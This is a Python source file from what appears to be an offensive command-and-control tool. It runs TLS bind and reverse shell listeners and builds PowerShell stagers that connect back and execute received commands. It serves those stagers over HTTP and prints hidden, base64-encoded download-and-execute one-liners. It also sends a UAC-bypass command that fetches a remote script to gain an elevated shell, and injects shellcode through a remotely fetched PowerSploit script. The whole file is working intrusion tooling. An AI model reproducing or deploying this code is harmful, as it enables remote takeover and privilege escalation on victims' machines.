#!/usr/bin/python
import socket
import ssl
import random
import re
import sys
import os
import time
import select
from threading import Thread
from main import *
from menu import *

def startBindListener(portnum,useProxy):
    try:
        bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bssl = ssl.wrap_socket(bs, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
        bssl.bind((FUNCTIONS().CheckInternet(), portnum))
        bssl.listen(1)

        if useProxy:
            bsp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bsp.bind(('127.0.0.1', 8888))
            bsp.listen(1)

    except:
        print t.bold_red + "[*] Error with listener - Port in use" + t.normal

    print t.bold_red + "listening on port %s"%portnum + t.normal

    bindClient, bindAddress = bssl.accept()
    bindIp, bindPort = bindAddress
    print t.bold_green + "connection from %s %s"%(bindIp, bindPort) + t.normal

    if useProxy:
        subprocess.Popen(['firefox','127.0.0.1:8888'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bindServer, bindServerAddress = bsp.accept()

    while bindClient:
        try:
            bindData = bindClient.recv(8000)
            if useProxy:
                bindServer.sendall(bindData)
                continue
            else:
                print bindData
        except:
            print t.bold_red + "connection closed from %s %s"%(bindIp, bindPort) + t.normal
            break

    if useProxy:
        bsp.close()
    bssl.close()


def startClientListener(bindOrReverse, ipADDR):
    time.sleep(0.25)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if bindOrReverse == 'r':
            ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
        else:
            ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256")
    except:
        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal)
        sys.stdout.flush()
        sys.exit(1)
    if bindOrReverse == 'r':
        try:
            ws.bind((FUNCTIONS().CheckInternet(), 5555))
            ws.listen(30)
        except:
            sys.stdout.write('\r' + t.bold_red + "[*] Listener Already Running\n" + t.normal)
            sys.stdout.flush()
            sys.exit(1)

        sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + t.bold_yellow + '\nMain Menu' + t.normal + ' > ')
        sys.stdout.flush()

    clientnumber = 0

    while True:
        if bindOrReverse == 'r':
            clientconn, address = ws.accept()
            ip , port = address

        elif bindOrReverse == 'b':
            ws.connect((ipADDR, 5555))
            ip, port = ipADDR, '5555'
            clientconn = ws

        if clientconn:
            clientnumber += 1
            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal)
            sys.stdout.flush()

            worker = Thread(target=pingClients, args=(clientconn,clientnumber))
            worker.setDaemon(True)
            worker.start()

        from menu import clientMenuOptions
        clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
        if bindOrReverse == 'b':
            sys.exit()


def interactShell(clientconn,clientnumber):
    computerName = ""
    from menu import clientMenuOptions
    print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\nuacbypass - UacBypass To Open New Admin Connection\n" + "-"*50
    while True:
        while clientconn in select.select([clientconn], [], [], 0.1)[0]:
            computerName += clientconn.recv(2048)
            if len(computerName) > 1:
                print t.bold_yellow + computerName + t.normal

        command = raw_input(" ")
        if command.lower() == "back":
            break
        elif command.lower() == "uacbypass":
            clientconn.sendall("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + "p.ps1" + "')\"")
        elif command == "":
            clientconn.sendall("\n")
        elif command.lower() == "exit":
            if str(clientnumber) in clientMenuOptions.keys():
                print t.bold_red + "Client %s Connection Killed"% clientnumber + t.normal
                del clientMenuOptions[str(clientnumber)]
                clientconn.close()
                time.sleep(2)
            break
        else:
            clientconn.sendall(command)

        while True:
            data = clientconn.recv(1).rstrip('\r')
            sys.stdout.write(data)
            sys.stdout.flush()
            if data == "\x00":
                break
    return "clear"


def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
    if powershellExec:
        if isExe:
            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
            encPowershell = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
            encPowershell = base64.b64encode(encPowershell.encode('utf_16_le'))
            powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)

        clientconn.sendall(powershellExec)

def printListener():
    while True:
        bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse: ' + t.normal).lower()
        if bindOrReverse == 'b' or bindOrReverse == 'r':
            break

    if bindOrReverse == 'r':
        windows_powershell_stager = (
            "cd ($env:SystemDrive + '\\');"
            "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
            "$b = New-Object Byte[] $c.ReceiveBufferSize;"
            "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
            "$sl.AuthenticateAsClient($env:computername);"
            "if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)){$ia = 'Admin: True'}else{$ia = 'Admin: False'};"
            "$h = \"ComputerName: \" + ($env:computername) + \"\n\" +$ia ;$he = ([text.encoding]::ASCII).GetBytes($h);$sl.Write($he,0,$he.Length);"
            "while(1){"
            "try{$i = $sl.Read($b, 0, $b.Length)}catch{exit};"
            "if ($i -lt 1){exit};"
            "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"`0\",\"\");"
            "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String);"
            "$br = $cb + ($error[0] | Out-String) + 'PS ' + (Get-Location).Path + '>' + \"`0\";$error.clear();"
            "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
            "$sl.Flush()}}")
    else:
        windows_powershell_stager = (
            "$Base64Cert = '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';"
            "$CertPassword = 'password';"
            "$SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword);"
            "cd ($env:SystemDrive + '\\');"
            "$listener = [System.Net.Sockets.TcpListener]5555;"
            "$listener.start();"
            "$client = $listener.AcceptTcpClient();"
            "$stream = $client.GetStream();"
            "$sl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
            "$sl.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls, $false);"
            "$b = New-Object Byte[] $client.ReceiveBufferSize;"
            "if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)){$ia = 'Admin: True'}else{$ia = 'Admin: False'};"
            "$h = \"ComputerName: \" + ($env:computername) + \"\n\" + $ia ;"
            "$he = ([text.encoding]::ASCII).GetBytes($h);"
            "$sl.Write($he,0,$he.Length);"
            "while(1){try{$i = $sl.Read($b, 0, $b.Length)}catch{exit};"
            "if ($i -lt 1){exit};"
            "$sb = New-Object -TypeName System.Text.ASCIIEncoding;"
            "$d = $sb.GetString($b,0, $i).replace(\"`0\",\"\");"
            "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String);"
            "$br = $cb + ($error[0] | Out-String) + 'PS ' + (Get-Location).Path + '>' + \"`0\";"
            "$error.clear();"
            "$sb = ([text.encoding]::ASCII).GetBytes($br);"
            "$sl.Write($sb,0,$sb.Length);"
            "$sl.Flush()}}"
        )

    powershellFileName = 'p.ps1'
    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
        powershellStagerFile.write(windows_powershell_stager)
        powershellStagerFile.close()
    global randoStagerDLPort # need to fix asap. Globals are shit fam
    randoStagerDLPort = random.randint(5000,9000)
    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')

    ipADDR = False
    if bindOrReverse == 'b':
        ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
    worker = Thread(target=startClientListener, args=(bindOrReverse, ipADDR))
    worker.setDaemon(True)
    worker.start()
    return "pass"

def pingClients(clientconn,clientnumber):
    from menu import clientMenuOptions

    try:
        while True:
            time.sleep(15)
            clientconn.sendall('\x00')
    except:
        if str(clientnumber) in clientMenuOptions.keys():
            print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
            del clientMenuOptions[str(clientnumber)]

        sys.exit(1)
